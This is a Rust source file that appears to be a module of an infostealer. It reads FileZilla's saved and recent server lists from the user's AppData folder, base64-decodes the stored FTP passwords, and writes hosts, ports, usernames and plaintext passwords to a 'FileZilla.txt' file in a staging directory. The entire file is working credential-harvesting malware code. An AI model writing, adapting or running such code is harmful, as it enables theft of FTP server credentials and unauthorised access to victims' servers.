use alloc::string::String;
use alloc::vec::Vec;
use alloc::format;
use tasks::Task;
use utils::path::{Path, WriteToFile};
use windows::core::HSTRING;
use windows::Data::Xml::Dom::XmlDocument;
use utils::base64::base64_decode;

pub(super) struct FileZillaTask;

impl Task for FileZillaTask {
    unsafe fn run(&self, parent: &Path) {
        let servers = collect_servers();
        
        if servers.len() == 0 {
            return;
        }
        
        let mut deduped = Vec::new();
        
        for server in servers {
            if !deduped.contains(&server) {
                deduped.push(server);
            }
        }
        
        let servers = deduped.iter().map(|server| {
            let password = base64_decode(server.password.as_bytes()).map(|decoded| String::from_utf8_lossy_owned(decoded));
            format!(
                "\
                Url: ftp://{}:{}/\n\
                Username: {}\n\
                Password: {}",
                server.host, server.port, server.user, if (password.is_none()) { &server.password } else { password.unwrap() }
            )
        }).collect::<Vec<_>>().join("\n\n");
        
        let output = parent / "FileZilla.txt";
        let _ = servers.write_to(&output);
    }
}

fn collect_servers() -> Vec<Server> {
    let mut result: Vec<Server> = Vec::new();
    let base = &Path::appdata() / "FileZilla";

    let paths = [
        (&base / "recentservers.xml", "RecentServers"),
        (&base / "sitemanager.xml", "Servers"),
    ];

    for (path, servers_node) in paths {
        if let Some(servers) = collect_servers_from_path(&path, servers_node) {
            result.extend(servers)
        }
    }

    result
}

fn collect_servers_from_path<S>(path: &Path, servers_node: S) -> Option<Vec<Server>>
where
    S: AsRef<str>,
{
    let mut result: Vec<Server> = Vec::new();

    if !path.is_exists() {
        return None;
    }

    let bytes = path.read_file();
    if bytes.is_err() {
        return None;
    }

    let bytes = bytes.ok()?;
    let content = String::from_utf8(bytes).ok()?;
    let content = HSTRING::from(content.as_str());

    let xml_doc = XmlDocument::new().ok()?;
    xml_doc.LoadXml(&content).ok()?;

    let root = xml_doc.DocumentElement().ok()?;
    let servers = root.SelectSingleNode(&HSTRING::from(servers_node.as_ref())).ok()?;
    
    let nodes = servers.SelectNodes(&HSTRING::from("Server")).ok()?;
    
    for i in 0..nodes.Length().ok()? {
        let server = nodes.Item(i).ok()?;
        
        let get_text = |name: &str| -> Option<String> {
            if let Some(child) = server.SelectSingleNode(&HSTRING::from(name)).ok() {
                Some(child.InnerText().ok()?.to_string_lossy())
            } else {
                Some(String::new())
            }
        };
        
        let host = get_text("Host")?;
        let port = get_text("Port")?.parse::<u16>().unwrap_or(0);
        let user = get_text("User")?;
        let password = get_text("Pass")?;
        
        result.push(Server {
            host,
            port, 
            user, 
            password
        })
    }
    
    Some(result)
}

#[derive(PartialEq)]
struct Server {
    host: String,
    port: u16,
    user: String,
    password: String
}